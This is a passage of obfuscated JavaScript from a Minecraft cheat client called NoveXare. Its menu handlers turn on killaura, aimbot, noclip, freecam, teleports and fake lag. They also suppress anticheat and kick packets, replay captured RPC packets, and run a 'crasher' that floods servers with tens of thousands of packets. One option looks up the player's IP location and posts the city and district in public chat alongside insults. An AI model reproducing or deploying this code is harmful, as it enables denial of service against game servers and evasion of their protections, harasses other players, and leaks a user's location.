          if (_0x63879a.items[0].items == undefined) {
            continue;
          }
          for (var _0xde7744 of _0x63879a.items[0].items) {
            if (_0xde7744.name == undefined || _0xde7744.key == undefined) {
              continue;
            }
            if (_0x197381) {
              if (_0xde7744.name.includes(_0x4c90a2) || _0xde7744.key.includes(_0x4c90a2)) {
                _0x5ed0b4.items[0].items[_0x4b3971] = _0xde7744;
                _0x4b3971++;
              }
            } else if (_0xde7744.name == _0x4c90a2 || _0xde7744.key == _0x4c90a2) {
              _0x5ed0b4.items[0].items[_0x4b3971] = _0xde7744;
              _0x4b3971++;
            }
          }
        }
        write_file(_0x1e37d1 + "/script/temp.js", "const t = String(Date.now());\nloadMenu(t, '" + JSON.stringify(_0x5ed0b4) + "');");
        loadScript("temp.js");
        setTimeout(() => file_delete(_0x1e37d1 + "/script/temp.js"), 500);
      });
    }
    if (_0x3215da.key === "delete_PlayPos" || key === "delete_PlayPos") {
      play_pos_list = [];
    }
    if (_0x3215da.key === "addPlayPos" || key === "addPlayPos") {
      const {
        x,
        y,
        z
      } = getPlayerBlockPos(self_id);
      addForm("{\"type\":\"custom_form\",\"title\":\"添加坐标\",\"content\":[{\"type\":\"input\",\"text\":\"以英文逗号 , 分割坐标\",\"placeholder\":\"0,0,0\",\"default\":\"" + obj2str([x, y, z]) + "\"}]}", function (_0x173825) {
        var _0x5989be = _0x173825.split(",");
        var _0x29c15c = {};
        _0x29c15c.x = Number(_0x5989be[0]);
        _0x29c15c.y = Number(_0x5989be[1]);
        _0x29c15c.z = Number(_0x5989be[2]);
        play_pos_list.push(_0x29c15c);
        if (show_tip) {
          clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " 添加坐标成功 当前" + play_pos_list.length + "组坐标");
        }
      });
    }
    if (_0x3215da.key === "load_sound" || key === "load_sound") {
      const _0x45183c = "{\"type\":\"custom_form\",\"title\":\"输入路径\",\"content\":[{\"type\":\"input\",\"text\":\"路径:\",\"default\":\"\"}]}";
      addForm(_0x45183c, function (_0x41c37e) {
        var _0x354245 = read_file(_0x41c37e);
        if (_0x354245 != "" && surround_sound) {
          sound_data = JSON.parse(_0x354245);
          sound_file = surround_loop ? _0x354245 : [];
          if (show_tip) {
            clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " 加载成功 共" + sound_data.length + "条音频数据");
          }
        } else if (show_tip) {
          clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " 加载失败 - 文件为空或不存在或未启用功能");
        }
      });
    }
    if (_0x3215da.key === "select_sound" || key === "select_sound") {
      const _0x3d9687 = {
        type: "form",
        title: "音乐文件",
        content: "选择要加载的音乐",
        buttons: [{
          text: "没有文件"
        }]
      };
      const _0x5728b7 = file_list(getResource() + "/sounds/NoveXare");
      _0x5728b7.sort((_0x301a65, _0x5cbafe) => _0x301a65.name.localeCompare(_0x5cbafe.name));
      for (let _0x1ec148 = 0; _0x1ec148 < _0x5728b7.length; _0x1ec148++) {
        _0x3d9687.buttons[_0x1ec148] = {
          text: _0x5728b7[_0x1ec148].name,
          image: {
            type: "path",
            data: "textures/ui/sound_glyph_color_2x.png"
          }
        };
      }
      const _0x2ad8a4 = JSON.stringify(_0x3d9687);
      addForm(_0x2ad8a4, function (_0x2dde7d) {
        if (_0x5728b7.length > 0 && _0x2dde7d >= 0) {
          var _0x4c5958 = read_file(_0x5728b7[_0x2dde7d].path);
          if (_0x4c5958 != "" && surround_sound) {
            sound_data = JSON.parse(_0x4c5958);
            sound_file = surround_loop ? _0x4c5958 : [];
            if (show_tip) {
              clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " 加载成功 共" + sound_data.length + "条音频数据");
            }
          } else if (show_tip) {
            clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " 加载失败 - 文件为空或不存在或未启用功能");
          }
        }
      });
    }
    if (_0x3215da.key === "save_config" || key === "save_config") {
      if (NoveXare_Config != {
        cmd: [],
        binds: {}
      }) {
        const _0x5a9dc1 = string_format("{\"type\":\"custom_form\",\"title\":\"输入保存名称\",\"content\":[{\"type\":\"input\",\"text\":\"名称:\",\"default\":\"{}\"}]}", "NX配置 - " + Date.now());
        addForm(_0x5a9dc1, function (_0x4111df) {
          write_file(config_path + "/" + _0x4111df + ".json", JSON.stringify(NoveXare_Config, null, 4));
          if (show_tip) {
            clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " 保存成功");
          }
        });
      } else if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " 暂无功能数据");
      }
    }
    if (_0x3215da.key === "load_config" || key === "load_config") {
      const _0x2bf9cd = {
        type: "form",
        title: "配置文件",
        content: "选择要加载的配置",
        buttons: [{
          text: "没有配置"
        }]
      };
      const _0x2b389b = file_list(config_path);
      _0x2b389b.sort((_0x2138ef, _0x1f660c) => _0x2138ef.name.localeCompare(_0x1f660c.name));
      for (let _0x554daa = 0; _0x554daa < _0x2b389b.length; _0x554daa++) {
        _0x2bf9cd.buttons[_0x554daa] = {
          text: _0x2b389b[_0x554daa].name,
          image: {
            type: "path",
            data: "textures/ui/gear.png"
          }
        };
      }
      const _0x1054ad = JSON.stringify(_0x2bf9cd);
      addForm(_0x1054ad, function (_0x2046a3) {
        if (_0x2b389b.length > 0 && _0x2046a3 >= 0) {
          let _0x47ee95 = JSON.parse(readFile(_0x2b389b[_0x2046a3].path));
          let _0x2fe279 = 0;
          for (let _0xb825b in _0x47ee95) {
            _0x2fe279++;
            if (_0xb825b.includes("_mode")) {
              func_mode[_0xb825b] = _0x47ee95[_0xb825b];
              continue;
            }
            if (_0xb825b != "cmd" && _0xb825b != "binds") {
              globalThis[_0xb825b] = _0x47ee95[_0xb825b];
            }
          }
          bind_func = _0x47ee95.binds;
          key_bind_list = _0x47ee95.key_binds;
          if (_0x47ee95.cmd.length > 0) {
            _0x47ee95.cmd.map(_0x27fb96 => PluginCMD(_0x27fb96));
          }
          if (show_tip) {
            clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " 加载成功，共" + _0x2fe279 + "条配置");
          }
        }
      });
    }
    if (_0x3215da.key === "SelectRPC" || key === "SelectRPC") {
      const _0x1eee13 = {
        type: "form",
        title: "PyRpc列表",
        content: "选择PyRpc",
        buttons: [{
          text: "没有PyRpc"
        }]
      };
      let _0x3ab1f5 = JSON.parse(read_file(getResource() + "/NoveXare/PyRpc_Record.json"));
      for (let _0x2aa566 = 0; _0x2aa566 < _0x3ab1f5.length; _0x2aa566++) {
        _0x1eee13.buttons[_0x2aa566] = {
          text: (_0x3ab1f5[_0x2aa566].type == "Send" ? "§a" : "§c") + _0x3ab1f5[_0x2aa566].packet_str
        };
      }
      const _0x13cf21 = JSON.stringify(_0x1eee13);
      addForm(_0x13cf21, function (_0x448889) {
        var _0x1a6751 = {
          id: _0x3ab1f5[_0x448889].id,
          data: _0x3ab1f5[_0x448889].packet_hex
        };
        last_PyRpc = _0x1a6751;
        if (show_tip) {
          clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " 已设置上一条PyRpc");
        }
      });
    }
    if (_0x3215da.key === "add_range_whitelist" || key === "add_range_whitelist") {
      var _0x2f743d = getPlayerList();
      var _0x2b7b20 = 0;
      for (let _0x47142e of _0x2f743d) {
        const _0x5d77a8 = getEntityPos(_0x47142e);
        const _0x128d3f = getDistance(_0x5d77a8, getEntityPos(self_id));
        if (!white_list.includes(_0x47142e) && _0x128d3f < whilelist_range && _0x47142e != self_id) {
          white_list.push(_0x47142e);
          _0x2b7b20++;
        }
      }
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " 已添加" + _0x2b7b20 + "个玩家到白名单");
      }
    }
    if (_0x3215da.key === "getTeams" || key === "getTeams") {
      const _0x47ebcd = getEntityCarriedItem(self_id);
      if (_0x47ebcd.namespace != "minecraft:wool") {
        if (show_tip) {
          clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " 请手持羊毛");
        }
        return;
      }
      team = color[_0x47ebcd.aux];
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r SetTeam §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " " + team);
      }
    }
    if (_0x3215da.key === "kick_self" || key === "kick_self") {
      for (let _0x2613df = 0; _0x2613df < 1000; _0x2613df++) {
        attack(self_id, attack_action);
      }
    }
    if (_0x3215da.key === "delete_ac" || key === "delete_ac") {
      ac_pos = [];
    }
    if (_0x3215da.key === "tp_down" || key === "tp_down") {
      const _0x1da564 = getEntityPos(self_id);
      setPos(_0x1da564.x, _0x1da564.y - 4, _0x1da564.z);
    }
    if (_0x3215da.key === "recover" || key === "recover") {
      other_user = null;
    }
    if (_0x3215da.key === "delete_chest" || key === "delete_chest") {
      chest_pos = [];
    }
    if (_0x3215da.key === "regex" || _0x3215da.key === "white_list" || key === "regex" || key === "white_list") {
      EditValue(_0x3215da.key, _0x3215da.key === "regex" ? regex : white_list);
    }
    if (_0x3215da.key === "add_whitelist" || _0x3215da.key === "add_target" || key === "add_whitelist" || _0x3215da.key === "add_target") {
      PlayerSelector(_0x3215da.key === "add_whitelist" ? "white_list" : "target_list", 1);
    }
    const _0xaef148 = getEntityPos(self_id);
    if (_0x3215da.key == "EditY" || key == "EditY") {
      setPos(_0xaef148.x, Edit_Y, _0xaef148.z);
    }
    if (_0x3215da.key == "surround_particle_add" || key == "surround_particle_add") {
      surround_particle_type = Number(surround_particle_type) + 1;
    }
    if (_0x3215da.key == "surround_sound_add" || key == "surround_sound_add") {
      surround_sound_type = Number(surround_sound_type) + 1;
    }
    if (_0x3215da.key == "remove_white_list" || key == "remove_white_list") {
      white_list = [];
    }
    if (_0x3215da.key === "rush" || key === "rush") {
      var _0x1bbb65 = getDisplacement(rush_length / 6, getEntityPos(self_id), getEntityRot(self_id));
      Teleport(_0x1bbb65.x, _0x1bbb65.y, _0x1bbb65.z);
    }
    if (key == "key") {
      continue;
    }
    if (_0x3215da.index != undefined) {
      func_mode[key] = _0x3215da.index - 1;
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r " + key + " §7>>>§r SetMode §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " " + _0x3215da[key]);
      }
      NoveXare_Config[key] = _0x3215da.index - 1;
      return true;
    }
    if (key == "kickaura") {
      callModule(41, "{\"array_list\":" + b2s(!_0x3215da[key]) + "}");
      if (kickaura_multi) {
        callModule(35, "{\"value\":" + b2s(_0x3215da[key]) + ",\"count\":" + kickaura_times + "}");
      }
      callModule(7, "{\"packet\":\"receive\",\"enable\":" + b2s(!_0x3215da[key]) + ",\"index\":9}");
    }
    if (key === "fake_move") {
      if (_0x3215da[key]) {
        fakemove_pos = getEntityPos(self_id);
      } else if (!_0x3215da[key]) {
        MenuTP(fakemove_pos.x, fakemove_pos.y, fakemove_pos.z);
      }
      callModule(41, "{\"array_list\":" + b2s(!_0x3215da[key]) + "}");
      var _0x3140af = {
        enable: !_0x3215da[key],
        index: 19,
        packet: "receive"
      };
      let _0x36be2a = _0x3140af;
      callModule(7, JSON.stringify({
        enable: false,
        index: 19,
        packet: "send"
      }));
      MenuTP(_0xaef148.x + 1000, _0xaef148.y + 1000, _0xaef148.z + 1000);
      var _0x451e8b = {
        enable: true,
        index: 19,
        packet: "send"
      };
      callModule(7, JSON.stringify(_0x451e8b));
      callModule(7, JSON.stringify(_0x36be2a));
      setTimeout(() => MenuTP(fakemove_pos.x + 15, fakemove_pos.y + 15, fakemove_pos.z + 15), 1000);
    }
    if (key == "crasher") {
      callModule(41, "{\"array_list\":" + b2s(!_0x3215da[key]) + "}");
      if (crasher_multi) {
        callModule(35, "{\"value\":" + b2s(_0x3215da[key]) + ",\"count\":" + crasher_times + "}");
      }
      if (func_mode.crasher_mode === 0) {
        callModule(68, "{\"value\":" + b2s(_0x3215da[key]) + ",\"multipleRpc\":true,\"particle\":false,\"forwardRpc\":true,\"count\":50000,\"antiPacket\":true}");
        callModule(69, "{\"0\":true,\"1\":true,\"2\":true,\"3\":true,\"4\":true,\"5\":true,\"6\":true,\"7\":true,\"8\":true,\"speed\":0,\"value\":" + b2s(_0x3215da[key]) + "}");
      }
      if (func_mode.crasher_mode === 5 || func_mode.crasher_mode === 4) {
        callModule(7, "{\"packet\":\"receive\",\"enable\":" + b2s(!_0x3215da[key]) + ",\"index\":9}");
      }
    }
    if (key == "bhop" && !_0x3215da[key]) {
      setEntityAttribute(self_id, "minecraft:movement", record_speed);
    }
    if (key == "InfiniteAura" && InfiniteAura_repeat) {
      callModule(35, "{\"value\":" + b2s(_0x3215da[key]) + ",\"count\":" + InfiniteAura_packet + "}");
    }
    if (teams && key == "team_origin") {
      if (_0x3215da[key]) {
        default_size = {
          x: 1.2,
          y: 1.2
        };
      }
      callModule(39, "{\"value\":" + b2s(_0x3215da[key]) + ",\"check_armor\":true}");
      setTimeout(() => callModule(31, "{\"value\":" + b2s(_0x3215da[key]) + ",\"size\":1.2,\"player\":true,\"distance\":20}"), 100);
      if (!_0x3215da[key]) {
        default_size = {
          x: 0.6,
          y: 1.8
        };
      }
    }
    if (key == "auto_breakdown") {
      setEntityName(getLocalPlayerUniqueID(), "test");
    }
    let _0x45cab9 = {
      no_practice: 25,
      no_latitude: 61,
      no_shake: 159,
      no_camera: 73,
      no_event: 65,
      no_title: 88,
      no_time: 10,
      no_ping: 115,
      no_skin: 93,
      no_sore: 107,
      no_animation: 44,
      no_bossbar: 74,
      no_sound: 86,
      no_server: 85,
      no_ground: 39,
      no_move: 40,
      no_chat: 9,
      no_start: 11,
      no_anticheat: 161,
      anti_kick: 5,
      move_packet: 19,
      block_update_packet: 21,
      hotbar_packet: 30,
      interact_packet: 33,
      operate_packet: 36,
      player_input_packet: 57,
      use_item_packet: 142
    };
    if (no_receive_packet) {
      for (const _0x2c8017 in _0x45cab9) {
        if (_0x2c8017.startsWith("no_") || _0x2c8017 === "anti_kick") {
          callModule(7, "{\"packet\":\"receive\",\"enable\":" + b2s(!_0x3215da[_0x2c8017]) + ",\"index\":" + _0x45cab9[_0x2c8017] + "}");
        }
      }
    }
    if (blink) {
      for (const _0x16e98d in _0x45cab9) {
        if (_0x16e98d.endsWith("_packet")) {
          callModule(7, "{\"packet\":\"send\",\"enable\":" + b2s(!_0x3215da[_0x16e98d]) + ",\"index\":" + _0x45cab9[_0x16e98d] + "}");
        }
      }
    }
    if (key === "time_pause") {
      callModule(7, "{\"packet\":\"receive\",\"enable\":" + b2s(!_0x3215da[key]) + ",\"index\":19}");
    }
    if (key === "click_tp") {
      callModule(56, "{\"reach\":255,\"value\":" + b2s(_0x3215da[key]) + "\"");
    }
    if (key == "freecam") {
      var _0x32432c = {
        value: true,
        noclip: _0x3215da[key],
        flying: _0x3215da[key]
      };
      let _0x50ea7b = _0x32432c;
      var _0x28ae59 = {
        value: _0x3215da[key]
      };
      let _0x377dfc = _0x28ae59;
      var _0x2b782d = {
        enable: !_0x3215da[key],
        index: 19,
        packet: "send"
      };
      let _0x49f85b = _0x2b782d;
      var _0x1aa023 = {
        enable: !_0x3215da[key],
        index: 161,
        packet: "receive"
      };
      let _0x3ec9f3 = _0x1aa023;
      callModule(41, "{\"array_list\":" + b2s(!_0x3215da[key]) + "}");
      callModule(1, JSON.stringify(_0x50ea7b));
      if (func_mode.freecam_mode == 0) {
        callModule(37, JSON.stringify(_0x377dfc));
      }
      if (func_mode.freecam_mode == 1) {
        callModule(7, JSON.stringify(_0x49f85b));
      }
      if (func_mode.freecam_mode == 2) {
        callModule(7, JSON.stringify(_0x3ec9f3));
      }
      if (key === "freecam" && _0x3215da[key]) {
        freecam_pos = getEntityPos(self_id);
      } else if (key === "freecam" && !_0x3215da[key]) {
        setEntityPos(self_id, freecam_pos.x, freecam_pos.y, freecam_pos.z);
      }
    }
    if (key === "RunAway") {
      callModule(7, "{\"packet\":\"receive\",\"enable\":" + b2s(!_0x3215da[key]) + ",\"index\":19");
    }
    if (key === "RunAway" && _0x3215da[key]) {
      RunAway_pos = getEntityPos(self_id);
    } else if (key === "RunAway" && !_0x3215da[key]) {
      setEntityPos(self_id, RunAway_pos.x, RunAway_pos.y, RunAway_pos.z);
    }
    if (key == "noclip") {
      var _0x494d4a = {
        value: _0x3215da[key],
        noclip: _0x3215da[key],
        flying: _0x3215da[key]
      };
      let _0x39cd3b = _0x494d4a;
      callModule(41, "{\"array_list\":" + b2s(!_0x3215da[key]) + "}");
      callModule(1, JSON.stringify(_0x39cd3b));
    }
    if (key == "balance_timer") {
      if (_0x3215da[key]) {
        callModule(41, "{\"array_list\":" + b2s(!_0x3215da[key]) + "}");
        callModule(37, "{\"value\":true}");
        balance_timer_st = false;
      } else {
        callModule(37, "{\"value\":false}");
        callModule(30, "{\"value\":true}");
        balance_timer_st = true;
      }
    }
    if (typeof _0x3215da[key] == "boolean" || typeof _0x3215da[key] == "number") {
      if (target_list.length > 0) {
        if (key == "hitbox_x") {
          temp_size.x = _0x3215da[key];
        }
        if (key == "hitbox_y") {
          temp_size.y = _0x3215da[key];
        }
      }
      if (target_list.length > 0 && key == "hitbox" && _0x3215da[key]) {
        default_size = temp_size;
      }
      if (key == "IQBoost") {
        let _0x503759 = getRandomNum(1, 5);
        let _0x2d8ee1 = getPlayerBlockPos(self_id);
        if (_0x503759 == 1) {
          curl_get("https://ip.useragentinfo.com/json?ip=", {}, function (_0x4152af, _0x3584dd) {
            var _0x54dfed = JSON.parse(_0x3584dd);
            sendChatMessage("!我是呱比，你们都是fvv LLL，有种就来" + _0x54dfed.province + _0x54dfed.city + _0x54dfed.area + "真实我");
          });
        } else if (_0x503759 == 2) {
          sendChatMessage("!你可以告诉我NoveXare怎么用吗，在我的世界上，求求");
        } else if (_0x503759 == 3) {
          sendChatMessage("!同款科技获取+");
        } else if (_0x503759 == 4) {
          sendChatMessage(string_format("!我在[{}, {}, {}]，你们都是彩笔，不服来击杀我", _0x2d8ee1.x, _0x2d8ee1.y, _0x2d8ee1.z));
        } else if (_0x503759 == 5) {
          sendChatMessage("!大开等于小开等于没开，我的小名叫dream，你们这群绿色玩家等着被我黄玮吉抽打吧");
        }
      }
      if (key == "auto_target" && !_0x3215da[key]) {
        target_list = [];
      }
      if (key == "surround_sound" && !_0x3215da[key]) {
        sound_data = [];
      }
      if (key == "fightbot" && !_0x3215da[key]) {
        if (fightbot_killaura) {
          killaura = false;
        }
        if (fightbot_aimbot) {
          assistaim = false;
        }
        if (fightbot_wtap) {
          wtap = false;
        }
        if (fightbot_scaffold) {
          scaffold = false;
        }
      }
      const _0x3d0320 = getEntityCarriedItem(self_id);
      if (key == "scaffold" && _0x3215da[key] && scaffold_auto_block) {
        block_namespace = _0x3d0320.namespace;
      }
      if (key == "fakelag") {
        if (func_mode.fakelag_mode == 0) {
          callModule(37, "{\"value\":" + _0x3215da[key] + "}");
        }
        if (func_mode.fakelag_mode == 1) {
          callModule(7, "{\"packet\":\"send\",\"enable\":" + b2s(!_0x3215da[key]) + ",\"index\":19}");
        }
        if (func_mode.fakelag_mode == 2) {
          callModule(7, "{\"packet\":\"receive\",\"enable\":" + b2s(!_0x3215da[key]) + ",\"index\":19}");
        }
      }
      if (key === "scaffold" && keep_y && _0x3215da[key]) {
        rec_y = 0;
      }
      if (key === "surround_loop" && !_0x3215da[key]) {
        sound_file = null;
      }
      if (key === "auto_speed" && _0x3215da[key]) {
        record_speed = getEntityAttribute(self_id, "minecraft:movement");
      } else if (key === "auto_speed" && !_0x3215da[key]) {
        setEntityAttribute(self_id, "minecraft:movement", record_speed);
      }
      if (key === "no_water_slowdown" && _0x3215da[key]) {
        record_water = getEntityAttribute(self_id, 2);
        record_lava = getEntityAttribute(self_id, 6);
      } else if (key === "no_water_slowdown" && !_0x3215da[key]) {
        setEntityAttribute(self_id, "minecraft:underwater_movement", record_water);
        setEntityAttribute(self_id, "minecraft:lava_movement", record_lava);
      }
      if (typeof _0x3215da[key] == "boolean") {
        if (_0x3215da[key]) {
          if (show_tip) {
            clientMessage("§3§l[NoveXare] §r§7>>>§r " + key + " §r§7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§a") + " §lEnable ◆");
          }
        } else if (show_tip) {
          clientMessage("§3§l[NoveXare] §r§7>>>§r " + key + " §r§7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§c") + " §lDisable ◇");
        }
        if (bind_func[key] != undefined && bind_func[key].length > 0) {
          for (let _0x5f46c8 of bind_func[key]) {
            callFunc(_0x5f46c8, _0x3215da[key]);
          }
        }
      }
      globalThis[key] = _0x3215da[key];
      NoveXare_Config[key] = _0x3215da[key];
    }
  }
};
globalThis.onPlayerAttackEvent = function (_0x39f01e, _0xe36e) {
  if (FakeTip && func_mode.fakeTip_mode === 2) {
    showTipMessage("§b[Relic] §r§lAttacking： §r" + getEntityName(_0xe36e));
  }
  if (FakeTip && func_mode.fakeTip_mode === 3) {
    showTipMessage("§a§l[Kaleidoscop - 万花筒]\n§r§l正在攻击： §r" + getEntityName(_0xe36e));
  }
  if (FakeTip && func_mode.fakeTip_mode === 4) {
    showTipMessage("§2[Heal Module] §r§l正在攻击： §r" + getEntityName(_0xe36e));
  }
  if (show_activity) {
    sendChatMessage("我正在攻击" + getEntityName(_0xe36e));
  }
  first_attack_health = getHealth(_0xe36e, -1);
  if (_0xe36e == null || _0xe36e == last_attack_target) {
    if (avoid_attack) {
      attack_action = avoid_attack && first_attack_health < last_attack_health;
    }
    if (first_attack_health >= last_attack_health) {
      empty_attack_frequency++;
    }
    attack_frequency++;
    last_attack_health = first_attack_health;
    isAttacking = true;
  } else {
    last_attack_target = _0xe36e;
    attack_ticks = 0;
    empty_attack_frequency = 0;
    attack_frequency = 0;
  }
  if (pvp_dalao) {
    setTitle("还是PVP大佬");
  }
  if (fun_other_user) {
    other_user = _0xe36e;
    return true;
  }
  if (attack_particle) {
    const _0x1f6448 = getEntityPos(_0xe36e);
    const _0x92cc9c = getEntitySize(_0xe36e);
    for (let _0x294587 = 0; _0x294587 < getRandomNum(attack_particle_size, attack_particle_size + 20); _0x294587++) {
      drawParticle(attack_particle_type, _0x1f6448.x + getRandomNum(-_0x92cc9c.x * getRandomNum(7, 10), _0x92cc9c.x * getRandomNum(7, 10)) / 10, _0x1f6448.y + getRandomNum(-_0x92cc9c.y * 9, _0x92cc9c.y * 2) / 10, _0x1f6448.z + getRandomNum(-_0x92cc9c.x * getRandomNum(7, 10), _0x92cc9c.x * getRandomNum(7, 10)) / 10, 1);
    }
  }
  if (attack_sound) {
    playSound(Number(attack_sound_type), Number(attack_sound_level));
    if (gradual_up) {
      attack_sound_level = Number(attack_sound_level) + 1;
    }
    if (gradual_up) {
      attack_tick = 0;
    }
  }
  if (record_target && click_mode) {
    const {
      x,
      y
    } = getEntitySize(_0xe36e);
    const _0x26df5d = getEntityMotion(_0xe36e);
    const _0xa42b6d = getEntityPos(_0xe36e);
    const _0x5430c4 = getEntityName(_0xe36e);
    const _0x123d06 = getEntityNamespace(_0xe36e);
    const _0x444dfe = getDistanceByID(self_id, _0xe36e);
    const _0x4c7f23 = getEntityCarriedItem(_0xe36e);
    const _0x351df7 = getSpeed(_0xe36e);
    const _0x3d59b8 = getEntityAttribute(_0xe36e, "minecraft:health");
    const _0x561b8c = getEntityAttribute(_0xe36e, "minecraft:movement");
    const _0x3df5fb = getEntityTypeId(_0xe36e);
    const _0x2d7c29 = getEntityTarget(_0xe36e);
    const _0x6e712a = getPlayerInventorySize(_0xe36e);
    const _0x4b5a93 = getPlayerHotBarSize(_0xe36e);
    const {
      yaw,
      pitch
    } = getEntityRot(_0xe36e);
    const _0x4c27f4 = string_format(`唯一ID:{} 昵称:{}§r 实体命名空间:{} 水平碰撞箱:{} 垂直碰撞箱:{} Mot速度:{} 
ability速度:[max:{}, min:{}, current:{}] 血量:[max:{}, min:{}, current:{}]
手持:[id:{}, namespace:{}, name:{}§r, aux:{}] 距离:{} 实体类型:{} 
仰俯角:{}° 偏航角:{}° 仇恨目标:{}^{}
移动值:[{}, {}, {}] 坐标值:[{}, {}, {}] 背包容量:{} 物品栏容量:{}`, _0xe36e, _0x5430c4, _0x123d06, x.toFixed(2), y.toFixed(2), _0x351df7, _0x561b8c.max, _0x561b8c.min, _0x561b8c.current, _0x3d59b8.max, _0x3d59b8.min, _0x3d59b8.current, _0x4c7f23.id, _0x4c7f23.namespace, _0x4c7f23.name, _0x4c7f23.aux, _0x444dfe, _0x3df5fb, pitch.toFixed(2), yaw.toFixed(2), getEntityName(_0x2d7c29), _0x2d7c29, _0x26df5d.x.toFixed(2), _0x26df5d.y.toFixed(2), _0x26df5d.z.toFixed(2), _0xa42b6d.x.toFixed(2), _0xa42b6d.y.toFixed(2), _0xa42b6d.z.toFixed(2), _0x6e712a, _0x4b5a93);
    if (show_tip) {
      clientMessage("§3§l[NoveXare] §r§7>>> §rTargetInfo §7>>>§r \n" + _0x4c27f4 + "\n§r§b==============================");
    }
    if (save_to_file) {
      write_file(NoveXare_path + "/" + _0x5430c4 + "_" + _0xe36e + ".txt", _0x4c27f4);
    }
    return true;
  }
  if (auto_weapon) {
    let _0x37a6d2 = [];
    for (let _0x5ba33d = 0; _0x5ba33d < 9; _0x5ba33d++) {
      _0x37a6d2.push({
        slot: _0x5ba33d,
        d: getItemDamage(self_id, _0x5ba33d)
      });
    }
    _0x37a6d2.sort((_0x107e33, _0x22f5a6) => _0x22f5a6.d - _0x107e33.d);
    var _0x54c7f2 = _0x37a6d2[0];
    if (_0x54c7f2.d > 1) {
      selectPlayerInventorySlot(self_id, _0x54c7f2.slot);
    }
  }
  if (click_target) {
    if (!target_list.includes(_0xe36e)) {
      target_list.push(_0xe36e);
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r AddTarget §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " " + getEntityName(_0xe36e));
      }
    } else {
      target_list.splice(target_list.indexOf(_0xe36e), 1);
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r DelTarget §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " " + getEntityName(_0xe36e));
      }
    }
    return true;
  }
  if (custom_kb) {
    const _0x1a0550 = getEntityPos(_0xe36e);
    const _0x21e302 = getEntityPos(_0x39f01e);
    const _0x20e731 = getPlayerAngle(_0x21e302, _0x1a0550, "yaw_pos");
    var _0x16ed5b = {
      yaw: _0x20e731,
      pitch: 0
    };
    const _0x4c4b16 = getDisplacement(-custom_kb_x / 2, _0x21e302, _0x16ed5b);
    setEntityMotion(_0xe36e, _0x4c4b16.x - _0x21e302.x, custom_kb_y, _0x4c4b16.z - _0x21e302.z);
  }
  if (click_whitelist) {
    if (!white_list.includes(_0xe36e)) {
      white_list.push(_0xe36e);
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r AddTarget §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " " + getEntityName(_0xe36e));
      }
    } else {
      white_list.splice(white_list.indexOf(_0xe36e), 1);
      if (show_tip) {
        clientMessage("§3§l[NoveXare] §r§7>>>§r DelTarget §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " " + getEntityName(_0xe36e));
      }
    }
    return true;
  }
  if (click_team && (!killaura || team == "NoveXare")) {
    team = getTeams(getEntityName(_0xe36e));
    if (show_tip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r SetTeam §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " " + team);
    }
    return true;
  }
  if (criticals) {
    callModule(44, "{\"value\":true}");
    setTimeout(() => callModule(44, "{\"value\":false}"), 100);
  }
  if (attack_draw) {
    callModule(75, "{\"value\":true,\"distance\":" + (getDistanceByID(self_id, _0xe36e) + 0.1) + "}");
    setTimeout(() => callModule(75, "{\"value\":false}"), 100);
  }
  if (killaura) {
    return getRandomNum(0, 100) < killaura_empty + 1;
  }
};
globalThis.onClientMessageEvent = function (_0xdd85ab) {
  if (show_client_message) {
    clientMessage("§3§l[NoveXare] §r§7>>>§r ClientMessage §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " " + _0xdd85ab);
  }
  if (chat_manager) {
    var _0x425899 = false;
    for (let _0x1eabdc of chat_keyword) {
      if (_0x425899) {
        break;
      }
      if (_0xdd85ab.includes(_0x1eabdc)) {
        _0x425899 = true;
      }
    }
    return _0x425899;
  }
  return show_client_message;
};
globalThis.onSendChatMessageEvent = function (_0x50a8b5) {
  if (_0x50a8b5 == "退出") {
    clientMessage("§3§l[NoveXare] §r§7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§c") + " Exit!");
    gc();
    exit();
    return true;
  }
  if (chat_suffix && !_0x50a8b5.includes(edit_suffix)) {
    sendChatMessage(_0x50a8b5 + edit_suffix);
    return true;
  }
};
globalThis.onPlayerJumpEvent = function (_0x2c6696) {
  if (show_activity) {
